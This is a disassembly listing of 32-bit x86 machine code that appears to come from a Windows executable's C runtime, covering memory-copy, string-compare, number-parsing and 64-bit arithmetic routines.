  428366:	jmp    DWORD PTR [edx*4+0x4283dc]
  42836d:	lea    ecx,[ecx+0x0]
  428370:	rol    DWORD PTR [ebx-0x7c3fffbe],cl
  428376:	inc    edx
  428377:	add    BYTE PTR [eax-0x4fffbd7d],bh
  42837d:	add    DWORD PTR [edx+0x0],0xffffffa8
  428381:	add    DWORD PTR [edx+0x0],0xffffffa0
  428385:	add    DWORD PTR [edx+0x0],0xffffff98
  428389:	add    DWORD PTR [edx+0x0],0xffffff90
  42838d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428391:	inc    esp
  428392:	mov    fs,esp
  428394:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283c8:	lea    eax,[ecx*4+0x0]
  4283cf:	add    esi,eax
  4283d1:	add    edi,eax
  4283d3:	jmp    DWORD PTR [edx*4+0x4283dc]
  4283da:	mov    edi,edi
  4283dc:	in     al,dx
  4283dd:	add    DWORD PTR [edx+0x0],0xfffffff4
  4283e1:	add    DWORD PTR [edx+0x0],0x0
  4283e5:	test   BYTE PTR [edx+0x0],al
  4283e8:	adc    al,0x84
  4283ea:	inc    edx
  4283eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4283f1:	leave  
  4283f2:	ret    
  4283f3:	nop
  4283f4:	mov    al,BYTE PTR [esi]
  4283f6:	mov    BYTE PTR [edi],al
  4283f8:	mov    eax,DWORD PTR [ebp+0x8]
  4283fb:	pop    esi
  4283fc:	pop    edi
  4283fd:	leave  
  4283fe:	ret    
  4283ff:	nop
  428400:	mov    al,BYTE PTR [esi]
  428402:	mov    BYTE PTR [edi],al
  428404:	mov    al,BYTE PTR [esi+0x1]
  428407:	mov    BYTE PTR [edi+0x1],al
  42840a:	mov    eax,DWORD PTR [ebp+0x8]
  42840d:	pop    esi
  42840e:	pop    edi
  42840f:	leave  
  428410:	ret    
  428411:	lea    ecx,[ecx+0x0]
  428414:	mov    al,BYTE PTR [esi]
  428416:	mov    BYTE PTR [edi],al
  428418:	mov    al,BYTE PTR [esi+0x1]
  42841b:	mov    BYTE PTR [edi+0x1],al
  42841e:	mov    al,BYTE PTR [esi+0x2]
  428421:	mov    BYTE PTR [edi+0x2],al
  428424:	mov    eax,DWORD PTR [ebp+0x8]
  428427:	pop    esi
  428428:	pop    edi
  428429:	leave  
  42842a:	ret    
  42842b:	nop
  42842c:	lea    esi,[ecx+esi*1-0x4]
  428430:	lea    edi,[ecx+edi*1-0x4]
  428434:	test   edi,0x3
  42843a:	jne    0x428460
  42843c:	shr    ecx,0x2
  42843f:	and    edx,0x3
  428442:	cmp    ecx,0x8
  428445:	jb     0x428454
  428447:	std    
  428448:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844a:	cld    
  42844b:	jmp    DWORD PTR [edx*4+0x428578]
  428452:	mov    edi,edi
  428454:	neg    ecx
  428456:	jmp    DWORD PTR [ecx*4+0x428528]
  42845d:	lea    ecx,[ecx+0x0]
  428460:	mov    eax,edi
  428462:	mov    edx,0x3
  428467:	cmp    ecx,0x4
  42846a:	jb     0x428478
  42846c:	and    eax,0x3
  42846f:	sub    ecx,eax
  428471:	jmp    DWORD PTR [eax*4+0x42847c]
  428478:	jmp    DWORD PTR [ecx*4+0x428578]
  42847f:	nop
  428480:	mov    WORD PTR [edx+eax*2+0x4284b000],es
  428487:	add    al,bl
  428489:	test   BYTE PTR [edx+0x0],al
  42848c:	mov    al,BYTE PTR [esi+0x3]
  42848f:	and    edx,ecx
  428491:	mov    BYTE PTR [edi+0x3],al
  428494:	sub    esi,0x1
  428497:	shr    ecx,0x2
  42849a:	sub    edi,0x1
  42849d:	cmp    ecx,0x8
  4284a0:	jb     0x428454
  4284a2:	std    
  4284a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284a5:	cld    
  4284a6:	jmp    DWORD PTR [edx*4+0x428578]
  4284ad:	lea    ecx,[ecx+0x0]
  4284b0:	mov    al,BYTE PTR [esi+0x3]
  4284b3:	and    edx,ecx
  4284b5:	mov    BYTE PTR [edi+0x3],al
  4284b8:	mov    al,BYTE PTR [esi+0x2]
  4284bb:	shr    ecx,0x2
  4284be:	mov    BYTE PTR [edi+0x2],al
  4284c1:	sub    esi,0x2
  4284c4:	sub    edi,0x2
  4284c7:	cmp    ecx,0x8
  4284ca:	jb     0x428454
  4284cc:	std    
  4284cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284cf:	cld    
  4284d0:	jmp    DWORD PTR [edx*4+0x428578]
  4284d7:	nop
  4284d8:	mov    al,BYTE PTR [esi+0x3]
  4284db:	and    edx,ecx
  4284dd:	mov    BYTE PTR [edi+0x3],al
  4284e0:	mov    al,BYTE PTR [esi+0x2]
  4284e3:	mov    BYTE PTR [edi+0x2],al
  4284e6:	mov    al,BYTE PTR [esi+0x1]
  4284e9:	shr    ecx,0x2
  4284ec:	mov    BYTE PTR [edi+0x1],al
  4284ef:	sub    esi,0x3
  4284f2:	sub    edi,0x3
  4284f5:	cmp    ecx,0x8
  4284f8:	jb     0x428454
  4284fe:	std    
  4284ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	cld    
  428502:	jmp    DWORD PTR [edx*4+0x428578]
  428509:	lea    ecx,[ecx+0x0]
  42850c:	sub    al,0x85
  42850e:	inc    edx
  42850f:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  428516:	inc    edx
  428517:	add    BYTE PTR [ebp+eax*4+0x42],al
  42851b:	add    BYTE PTR [ebp+eax*4+0x42],cl
  42851f:	add    BYTE PTR [ebp+eax*4+0x42],dl
  428523:	add    BYTE PTR [ebp+eax*4+0x42],bl
  428527:	add    BYTE PTR [edi-0x7b],ch
  42852a:	inc    edx
  42852b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428531:	inc    esp
  428532:	(bad)  
  428533:	sbb    al,0x8b
  428535:	inc    esp
  428536:	mov    ds,WORD PTR [eax]
  428538:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428540:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428548:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428550:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428554:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428558:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42855c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428560:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428564:	lea    eax,[ecx*4+0x0]
  42856b:	add    esi,eax
  42856d:	add    edi,eax
  42856f:	jmp    DWORD PTR [edx*4+0x428578]
  428576:	mov    edi,edi
  428578:	mov    BYTE PTR [ebp-0x7a6fffbe],al
  42857e:	inc    edx
  42857f:	add    BYTE PTR [eax-0x4bffbd7b],ah
  428585:	test   DWORD PTR [edx+0x0],eax
  428588:	mov    eax,DWORD PTR [ebp+0x8]
  42858b:	pop    esi
  42858c:	pop    edi
  42858d:	leave  
  42858e:	ret    
  42858f:	nop
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    eax,DWORD PTR [ebp+0x8]
  428599:	pop    esi
  42859a:	pop    edi
  42859b:	leave  
  42859c:	ret    
  42859d:	lea    ecx,[ecx+0x0]
  4285a0:	mov    al,BYTE PTR [esi+0x3]
  4285a3:	mov    BYTE PTR [edi+0x3],al
  4285a6:	mov    al,BYTE PTR [esi+0x2]
  4285a9:	mov    BYTE PTR [edi+0x2],al
  4285ac:	mov    eax,DWORD PTR [ebp+0x8]
  4285af:	pop    esi
  4285b0:	pop    edi
  4285b1:	leave  
  4285b2:	ret    
  4285b3:	nop
  4285b4:	mov    al,BYTE PTR [esi+0x3]
  4285b7:	mov    BYTE PTR [edi+0x3],al
  4285ba:	mov    al,BYTE PTR [esi+0x2]
  4285bd:	mov    BYTE PTR [edi+0x2],al
  4285c0:	mov    al,BYTE PTR [esi+0x1]
  4285c3:	mov    BYTE PTR [edi+0x1],al
  4285c6:	mov    eax,DWORD PTR [ebp+0x8]
  4285c9:	pop    esi
  4285ca:	pop    edi
  4285cb:	leave  
  4285cc:	ret    
  4285cd:	push   ebp
  4285ce:	mov    ebp,esp
  4285d0:	sub    esp,0xc
  4285d3:	mov    eax,ds:0x45d430
  4285d8:	xor    eax,DWORD PTR [ebp+0x4]
  4285db:	and    BYTE PTR [ebp-0x6],0x0
  4285df:	push   0x6
  4285e1:	mov    DWORD PTR [ebp-0x4],eax
  4285e4:	lea    eax,[ebp-0xc]
  4285e7:	push   eax
  4285e8:	push   0x1004
  4285ed:	push   DWORD PTR [ebp+0x8]
  4285f0:	call   DWORD PTR ds:0x429100
  4285f6:	test   eax,eax
  4285f8:	jne    0x4285ff
  4285fa:	or     eax,0xffffffff
  4285fd:	jmp    0x428609
  4285ff:	lea    eax,[ebp-0xc]
  428602:	push   eax
  428603:	call   0x42890e
  428608:	pop    ecx
  428609:	mov    ecx,DWORD PTR [ebp-0x4]
  42860c:	xor    ecx,DWORD PTR [ebp+0x4]
  42860f:	call   0x425a1c
  428614:	leave  
  428615:	ret    
  428616:	push   0x38
  428618:	push   0x429fc0
  42861d:	call   0x425350
  428622:	mov    eax,ds:0x45d430
  428627:	xor    eax,DWORD PTR [ebp+0x4]
  42862a:	mov    DWORD PTR [ebp-0x1c],eax
  42862d:	xor    edi,edi
  42862f:	mov    DWORD PTR [ebp-0x20],edi
  428632:	mov    DWORD PTR [ebp-0x24],edi
  428635:	mov    eax,DWORD PTR [ebp+0x14]
  428638:	mov    ebx,DWORD PTR [eax]
  42863a:	mov    DWORD PTR [ebp-0x28],ebx
  42863d:	mov    DWORD PTR [ebp-0x2c],edi
  428640:	mov    eax,DWORD PTR [ebp+0x8]
  428643:	cmp    eax,DWORD PTR [ebp+0xc]
  428646:	je     0x4287bf
  42864c:	lea    ecx,[ebp-0x40]
  42864f:	push   ecx
  428650:	push   eax
  428651:	mov    esi,DWORD PTR ds:0x4290c8
  428657:	call   esi
  428659:	test   eax,eax
  42865b:	je     0x42867d
  42865d:	cmp    DWORD PTR [ebp-0x40],0x1
  428661:	jne    0x42867d
  428663:	lea    eax,[ebp-0x40]
  428666:	push   eax
  428667:	push   DWORD PTR [ebp+0xc]
  42866a:	call   esi
  42866c:	test   eax,eax
  42866e:	je     0x42867d
  428670:	cmp    DWORD PTR [ebp-0x40],0x1
  428674:	jne    0x42867d
  428676:	mov    DWORD PTR [ebp-0x2c],0x1
  42867d:	cmp    DWORD PTR [ebp-0x2c],edi
  428680:	je     0x42869c
  428682:	cmp    ebx,0xffffffff
  428685:	je     0x42868b
  428687:	mov    esi,ebx
  428689:	jmp    0x428697
  42868b:	push   DWORD PTR [ebp+0x10]
  42868e:	call   0x425960
  428693:	pop    ecx
  428694:	mov    esi,eax
  428696:	inc    esi
  428697:	mov    DWORD PTR [ebp-0x44],esi
  42869a:	jmp    0x42869f
  42869c:	mov    esi,DWORD PTR [ebp-0x44]
  42869f:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a2:	jne    0x4286be
  4286a4:	push   edi
  4286a5:	push   edi
  4286a6:	push   ebx
  4286a7:	push   DWORD PTR [ebp+0x10]
  4286aa:	push   0x1
  4286ac:	push   DWORD PTR [ebp+0x8]
  4286af:	call   DWORD PTR ds:0x4290f0
  4286b5:	mov    esi,eax
  4286b7:	mov    DWORD PTR [ebp-0x44],esi
  4286ba:	cmp    esi,edi
  4286bc:	je     0x428716
  4286be:	mov    DWORD PTR [ebp-0x4],edi
  4286c1:	lea    eax,[esi+esi*1]
  4286c4:	add    eax,0x3
  4286c7:	and    eax,0xfffffffc
  4286ca:	call   0x4253a0
  4286cf:	mov    DWORD PTR [ebp-0x18],esp
  4286d2:	mov    ebx,esp
  4286d4:	mov    DWORD PTR [ebp-0x48],ebx
  4286d7:	lea    eax,[esi+esi*1]
  4286da:	push   eax
  4286db:	push   edi
  4286dc:	push   ebx
  4286dd:	call   0x427c50
  4286e2:	add    esp,0xc
  4286e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286e9:	jmp    0x428702
  4286eb:	xor    eax,eax
  4286ed:	inc    eax
  4286ee:	ret    
  4286ef:	mov    esp,DWORD PTR [ebp-0x18]
  4286f2:	call   0x4287e5
  4286f7:	xor    edi,edi
  4286f9:	xor    ebx,ebx
  4286fb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ff:	mov    esi,DWORD PTR [ebp-0x44]
  428702:	cmp    ebx,edi
  428704:	jne    0x428724
  428706:	push   esi
  428707:	push   0x2
  428709:	call   0x426468
  42870e:	pop    ecx
  42870f:	pop    ecx
  428710:	mov    ebx,eax
  428712:	cmp    ebx,edi
  428714:	jne    0x42871d
  428716:	xor    eax,eax
  428718:	jmp    0x4287d1
  42871d:	mov    DWORD PTR [ebp-0x24],0x1
  428724:	push   esi
  428725:	push   ebx
  428726:	push   DWORD PTR [ebp-0x28]
  428729:	push   DWORD PTR [ebp+0x10]
  42872c:	push   0x1
  42872e:	push   DWORD PTR [ebp+0x8]
  428731:	call   DWORD PTR ds:0x4290f0
  428737:	test   eax,eax
  428739:	je     0x4287c2
  42873f:	cmp    DWORD PTR [ebp+0x18],edi
  428742:	je     0x428764
  428744:	push   edi
  428745:	push   edi
  428746:	push   DWORD PTR [ebp+0x1c]
  428749:	push   DWORD PTR [ebp+0x18]
  42874c:	push   esi
  42874d:	push   ebx
  42874e:	push   edi
  42874f:	push   DWORD PTR [ebp+0xc]
  428752:	call   DWORD PTR ds:0x429080
  428758:	test   eax,eax
  42875a:	je     0x4287c2
  42875c:	mov    eax,DWORD PTR [ebp+0x18]
  42875f:	mov    DWORD PTR [ebp-0x20],eax
  428762:	jmp    0x4287c2
  428764:	cmp    DWORD PTR [ebp-0x2c],edi
  428767:	jne    0x42877f
  428769:	push   edi
  42876a:	push   edi
  42876b:	push   edi
  42876c:	push   edi
  42876d:	push   esi
  42876e:	push   ebx
  42876f:	push   edi
  428770:	push   DWORD PTR [ebp+0xc]
  428773:	call   DWORD PTR ds:0x429080
  428779:	mov    esi,eax
  42877b:	cmp    esi,edi
  42877d:	je     0x4287c2
  42877f:	push   esi
  428780:	push   0x1
  428782:	call   0x426468
  428787:	pop    ecx
  428788:	pop    ecx
  428789:	mov    DWORD PTR [ebp-0x20],eax
  42878c:	cmp    eax,edi
  42878e:	je     0x4287c2
  428790:	push   edi
  428791:	push   edi
  428792:	push   esi
  428793:	push   eax
  428794:	push   esi
  428795:	push   ebx
  428796:	push   edi
  428797:	push   DWORD PTR [ebp+0xc]
  42879a:	call   DWORD PTR ds:0x429080
  4287a0:	cmp    eax,edi
  4287a2:	jne    0x4287b2
  4287a4:	push   DWORD PTR [ebp-0x20]
  4287a7:	call   0x425f5a
  4287ac:	pop    ecx
  4287ad:	mov    DWORD PTR [ebp-0x20],edi
  4287b0:	jmp    0x4287c2
  4287b2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287b6:	je     0x4287c2
  4287b8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287bb:	mov    DWORD PTR [ecx],eax
  4287bd:	jmp    0x4287c2
  4287bf:	mov    ebx,DWORD PTR [ebp-0x48]
  4287c2:	cmp    DWORD PTR [ebp-0x24],edi
  4287c5:	je     0x4287ce
  4287c7:	push   ebx
  4287c8:	call   0x425f5a
  4287cd:	pop    ecx
  4287ce:	mov    eax,DWORD PTR [ebp-0x20]
  4287d1:	lea    esp,[ebp-0x54]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287d7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287da:	call   0x425a1c
  4287df:	call   0x42538b
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x48
  4287eb:	push   ebx
  4287ec:	push   esi
  4287ed:	push   edi
  4287ee:	push   0x4
  4287f0:	pop    eax
  4287f1:	call   0x4253a0
  4287f6:	mov    ebx,esp
  4287f8:	push   0x1c
  4287fa:	lea    eax,[ebp-0x24]
  4287fd:	push   eax
  4287fe:	push   ebx
  4287ff:	call   DWORD PTR ds:0x42910c
  428805:	test   eax,eax
  428807:	je     0x42887a
  428809:	mov    edi,DWORD PTR [ebp-0x20]
  42880c:	lea    eax,[ebp-0x48]
  42880f:	push   eax
  428810:	call   DWORD PTR ds:0x42904c
  428816:	mov    eax,DWORD PTR [ebp-0x44]
  428819:	lea    esi,[eax-0x1]
  42881c:	not    esi
  42881e:	and    esi,ebx
  428820:	sub    esi,eax
  428822:	mov    DWORD PTR [ebp-0x4],eax
  428825:	mov    eax,ds:0x45dac4
  42882a:	mov    ecx,eax
  42882c:	dec    ecx
  42882d:	neg    ecx
  42882f:	sbb    ecx,ecx
  428831:	and    ecx,0xffff1000
  428837:	add    ecx,0x11000
  42883d:	add    ecx,edi
  42883f:	cmp    esi,ecx
  428841:	jb     0x42887a
  428843:	cmp    eax,0x1
  428846:	je     0x428892
  428848:	mov    ebx,edi
  42884a:	mov    edi,0x1000
  42884f:	push   0x1c
  428851:	lea    eax,[ebp-0x24]
  428854:	push   eax
  428855:	push   ebx
  428856:	call   DWORD PTR ds:0x42910c
  42885c:	test   eax,eax
  42885e:	je     0x42887a
  428860:	add    ebx,DWORD PTR [ebp-0x18]
  428863:	test   DWORD PTR [ebp-0x14],edi
  428866:	je     0x42884f
  428868:	test   BYTE PTR [ebp-0xf],0x1
  42886c:	mov    ebx,DWORD PTR [ebp-0x24]
  42886f:	je     0x428876
  428871:	xor    eax,eax
  428873:	inc    eax
  428874:	jmp    0x4288ae
  428876:	cmp    esi,ebx
  428878:	jae    0x42887e
  42887a:	xor    eax,eax
  42887c:	jmp    0x4288ae
  42887e:	push   0x4
  428880:	push   edi
  428881:	push   DWORD PTR [ebp-0x4]
  428884:	push   ebx
  428885:	call   DWORD PTR ds:0x4290d0
  42888b:	mov    eax,ds:0x45dac4
  428890:	jmp    0x428894
  428892:	mov    ebx,esi
  428894:	dec    eax
  428895:	neg    eax
  428897:	sbb    eax,eax
  428899:	and    eax,0x103
  42889e:	lea    ecx,[ebp-0x8]
  4288a1:	push   ecx
  4288a2:	inc    eax
  4288a3:	push   eax
  4288a4:	push   DWORD PTR [ebp-0x4]
  4288a7:	push   ebx
  4288a8:	call   DWORD PTR ds:0x429108
  4288ae:	lea    esp,[ebp-0x54]
  4288b1:	pop    edi
  4288b2:	pop    esi
  4288b3:	pop    ebx
  4288b4:	leave  
  4288b5:	ret    
  4288b6:	int3   
  4288b7:	int3   
  4288b8:	int3   
  4288b9:	int3   
  4288ba:	int3   
  4288bb:	int3   
  4288bc:	int3   
  4288bd:	int3   
  4288be:	int3   
  4288bf:	int3   
  4288c0:	push   ebp
  4288c1:	mov    ebp,esp
  4288c3:	push   edi
  4288c4:	push   esi
  4288c5:	push   ebx
  4288c6:	mov    esi,DWORD PTR [ebp+0xc]
  4288c9:	mov    edi,DWORD PTR [ebp+0x8]
  4288cc:	mov    al,0xff
  4288ce:	mov    edi,edi
  4288d0:	or     al,al
  4288d2:	je     0x428906
  4288d4:	mov    al,BYTE PTR [esi]
  4288d6:	add    esi,0x1
  4288d9:	mov    ah,BYTE PTR [edi]
  4288db:	add    edi,0x1
  4288de:	cmp    ah,al
  4288e0:	je     0x4288d0
  4288e2:	sub    al,0x41
  4288e4:	cmp    al,0x1a
  4288e6:	sbb    cl,cl
  4288e8:	and    cl,0x20
  4288eb:	add    al,cl
  4288ed:	add    al,0x41
  4288ef:	xchg   al,ah
  4288f1:	sub    al,0x41
  4288f3:	cmp    al,0x1a
  4288f5:	sbb    cl,cl
  4288f7:	and    cl,0x20
  4288fa:	add    al,cl
  4288fc:	add    al,0x41
  4288fe:	cmp    al,ah
  428900:	je     0x4288d0
  428902:	sbb    al,al
  428904:	sbb    al,0xff
  428906:	movsx  eax,al
  428909:	pop    ebx
  42890a:	pop    esi
  42890b:	pop    edi
  42890c:	leave  
  42890d:	ret    
  42890e:	push   esi
  42890f:	push   edi
  428910:	call   0x425203
  428915:	mov    edi,DWORD PTR [eax+0x64]
  428918:	cmp    edi,DWORD PTR ds:0x45d58c
  42891e:	je     0x428927
  428920:	call   0x4266af
  428925:	mov    edi,eax
  428927:	mov    esi,DWORD PTR [esp+0xc]
  42892b:	cmp    DWORD PTR [edi+0x28],0x1
  42892f:	movzx  eax,BYTE PTR [esi]
  428932:	jle    0x428942
  428934:	push   0x8
  428936:	push   eax
  428937:	push   edi
  428938:	call   0x428996
  42893d:	add    esp,0xc
  428940:	jmp    0x42894c
  428942:	mov    ecx,DWORD PTR [edi+0x48]
  428945:	movzx  eax,BYTE PTR [ecx+eax*2]
  428949:	and    eax,0x8
  42894c:	test   eax,eax
  42894e:	je     0x428953
  428950:	inc    esi
  428951:	jmp    0x42892b
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	cmp    ecx,0x2d
  42895a:	mov    edx,ecx
  42895c:	je     0x428963
  42895e:	cmp    ecx,0x2b
  428961:	jne    0x428967
  428963:	movzx  ecx,BYTE PTR [esi]
  428966:	inc    esi
  428967:	xor    eax,eax
  428969:	cmp    ecx,0x30
  42896c:	jl     0x428978
  42896e:	cmp    ecx,0x39
  428971:	jg     0x428978
  428973:	sub    ecx,0x30
  428976:	jmp    0x42897b
  428978:	or     ecx,0xffffffff
  42897b:	cmp    ecx,0xffffffff
  42897e:	je     0x42898c
  428980:	lea    eax,[eax+eax*4]
  428983:	lea    eax,[ecx+eax*2]
  428986:	movzx  ecx,BYTE PTR [esi]
  428989:	inc    esi
  42898a:	jmp    0x428969
  42898c:	cmp    edx,0x2d
  42898f:	pop    edi
  428990:	pop    esi
  428991:	jne    0x428995
  428993:	neg    eax
  428995:	ret    
  428996:	push   ebp
  428997:	mov    ebp,esp
  428999:	push   ecx
  42899a:	mov    eax,DWORD PTR [ebp+0xc]
  42899d:	lea    ecx,[eax+0x1]
  4289a0:	cmp    ecx,0x100
  4289a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a9:	ja     0x4289b4
  4289ab:	mov    ecx,DWORD PTR [ecx+0x48]
  4289ae:	movzx  eax,WORD PTR [ecx+eax*2]
  4289b2:	jmp    0x428a08
  4289b4:	push   esi
  4289b5:	mov    edx,eax
  4289b7:	sar    edx,0x8
  4289ba:	push   edi
  4289bb:	mov    edi,DWORD PTR [ecx+0x48]
  4289be:	movzx  esi,dl
  4289c1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289c6:	pop    edi
  4289c7:	pop    esi
  4289c8:	je     0x4289d9
  4289ca:	and    BYTE PTR [ebp-0x2],0x0
  4289ce:	push   0x2
  4289d0:	mov    BYTE PTR [ebp-0x3],al
  4289d3:	mov    BYTE PTR [ebp-0x4],dl
  4289d6:	pop    eax
  4289d7:	jmp    0x4289e3
  4289d9:	and    BYTE PTR [ebp-0x3],0x0
  4289dd:	mov    BYTE PTR [ebp-0x4],al
  4289e0:	xor    eax,eax
  4289e2:	inc    eax
  4289e3:	push   0x1
  4289e5:	push   DWORD PTR [ecx+0x14]
  4289e8:	push   DWORD PTR [ecx+0x4]
  4289eb:	lea    ecx,[ebp+0xe]
  4289ee:	push   ecx
  4289ef:	push   eax
  4289f0:	lea    eax,[ebp-0x4]
  4289f3:	push   eax
  4289f4:	push   0x1
  4289f6:	call   0x427a78
  4289fb:	add    esp,0x1c
  4289fe:	test   eax,eax
  428a00:	jne    0x428a04
  428a02:	leave  
  428a03:	ret    
  428a04:	movzx  eax,WORD PTR [ebp+0xe]
  428a08:	and    eax,DWORD PTR [ebp+0x10]
  428a0b:	leave  
  428a0c:	ret    
  428a0d:	int3   
  428a0e:	int3   
  428a0f:	int3   
  428a10:	mov    eax,DWORD PTR [esp+0x8]
  428a14:	mov    ecx,DWORD PTR [esp+0x10]
  428a18:	or     ecx,eax
  428a1a:	mov    ecx,DWORD PTR [esp+0xc]
  428a1e:	jne    0x428a29
  428a20:	mov    eax,DWORD PTR [esp+0x4]
  428a24:	mul    ecx
  428a26:	ret    0x10
  428a29:	push   ebx
  428a2a:	mul    ecx
  428a2c:	mov    ebx,eax
  428a2e:	mov    eax,DWORD PTR [esp+0x8]
  428a32:	mul    DWORD PTR [esp+0x14]
  428a36:	add    ebx,eax
  428a38:	mov    eax,DWORD PTR [esp+0x8]
  428a3c:	mul    ecx
  428a3e:	add    edx,ebx
  428a40:	pop    ebx
  428a41:	ret    0x10
  428a44:	int3   
  428a45:	int3   
  428a46:	int3   
  428a47:	int3   
  428a48:	int3   
  428a49:	int3   
  428a4a:	int3   
  428a4b:	int3   
  428a4c:	int3   
  428a4d:	int3   
  428a4e:	int3   
  428a4f:	int3   
  428a50:	push   ebp
  428a51:	mov    ebp,esp
  428a53:	push   edi
  428a54:	push   esi
  428a55:	push   ebx
  428a56:	mov    ecx,DWORD PTR [ebp+0x10]
  428a59:	or     ecx,ecx
  428a5b:	je     0x428aaa
  428a5d:	mov    esi,DWORD PTR [ebp+0x8]
  428a60:	mov    edi,DWORD PTR [ebp+0xc]
  428a63:	mov    bh,0x41
  428a65:	mov    bl,0x5a
  428a67:	mov    dh,0x20
  428a69:	lea    ecx,[ecx+0x0]
  428a6c:	mov    ah,BYTE PTR [esi]
  428a6e:	or     ah,ah
  428a70:	mov    al,BYTE PTR [edi]
  428a72:	je     0x428a9b
  428a74:	or     al,al
  428a76:	je     0x428a9b
  428a78:	add    esi,0x1
  428a7b:	add    edi,0x1
  428a7e:	cmp    ah,bh
  428a80:	jb     0x428a88
  428a82:	cmp    ah,bl
  428a84:	ja     0x428a88
  428a86:	add    ah,dh
  428a88:	cmp    al,bh
  428a8a:	jb     0x428a92
  428a8c:	cmp    al,bl
  428a8e:	ja     0x428a92
  428a90:	add    al,dh
  428a92:	cmp    ah,al
  428a94:	jne    0x428aa1
  428a96:	sub    ecx,0x1
  428a99:	jne    0x428a6c
  428a9b:	xor    ecx,ecx
  428a9d:	cmp    ah,al
  428a9f:	je     0x428aaa
  428aa1:	mov    ecx,0xffffffff
  428aa6:	jb     0x428aaa
  428aa8:	neg    ecx
  428aaa:	mov    eax,ecx
  428aac:	pop    ebx
  428aad:	pop    esi
  428aae:	pop    edi
  428aaf:	leave  
  428ab0:	ret    
  428ab1:	int3   
  428ab2:	int3   
  428ab3:	int3   
  428ab4:	int3   
  428ab5:	int3   
  428ab6:	int3   
  428ab7:	int3   
  428ab8:	int3   
  428ab9:	int3   
  428aba:	int3   
  428abb:	int3   
  428abc:	int3   
  428abd:	int3   
  428abe:	int3   
  428abf:	int3   
  428ac0:	push   esi
  428ac1:	mov    eax,DWORD PTR [esp+0x14]
  428ac5:	or     eax,eax
  428ac7:	jne    0x428af1
  428ac9:	mov    ecx,DWORD PTR [esp+0x10]
  428acd:	mov    eax,DWORD PTR [esp+0xc]
  428ad1:	xor    edx,edx
  428ad3:	div    ecx
  428ad5:	mov    ebx,eax
  428ad7:	mov    eax,DWORD PTR [esp+0x8]
  428adb:	div    ecx
  428add:	mov    esi,eax
  428adf:	mov    eax,ebx
  428ae1:	mul    DWORD PTR [esp+0x10]
  428ae5:	mov    ecx,eax
  428ae7:	mov    eax,esi
  428ae9:	mul    DWORD PTR [esp+0x10]
  428aed:	add    edx,ecx
  428aef:	jmp    0x428b38
  428af1:	mov    ecx,eax
  428af3:	mov    ebx,DWORD PTR [esp+0x10]
  428af7:	mov    edx,DWORD PTR [esp+0xc]
  428afb:	mov    eax,DWORD PTR [esp+0x8]
  428aff:	shr    ecx,1
  428b01:	rcr    ebx,1
  428b03:	shr    edx,1
  428b05:	rcr    eax,1
  428b07:	or     ecx,ecx
  428b09:	jne    0x428aff
  428b0b:	div    ebx
  428b0d:	mov    esi,eax
  428b0f:	mul    DWORD PTR [esp+0x14]
  428b13:	mov    ecx,eax
  428b15:	mov    eax,DWORD PTR [esp+0x10]
  428b19:	mul    esi
  428b1b:	add    edx,ecx
  428b1d:	jb     0x428b2d
  428b1f:	cmp    edx,DWORD PTR [esp+0xc]
  428b23:	ja     0x428b2d
  428b25:	jb     0x428b36
  428b27:	cmp    eax,DWORD PTR [esp+0x8]
  428b2b:	jbe    0x428b36
  428b2d:	dec    esi
  428b2e:	sub    eax,DWORD PTR [esp+0x10]
  428b32:	sbb    edx,DWORD PTR [esp+0x14]
  428b36:	xor    ebx,ebx
  428b38:	sub    eax,DWORD PTR [esp+0x8]
  428b3c:	sbb    edx,DWORD PTR [esp+0xc]
  428b40:	neg    edx
  428b42:	neg    eax
  428b44:	sbb    edx,0x0
  428b47:	mov    ecx,edx
  428b49:	mov    edx,ebx
  428b4b:	mov    ebx,ecx
  428b4d:	mov    ecx,eax
  428b4f:	mov    eax,esi
  428b51:	pop    esi
  428b52:	ret    0x10
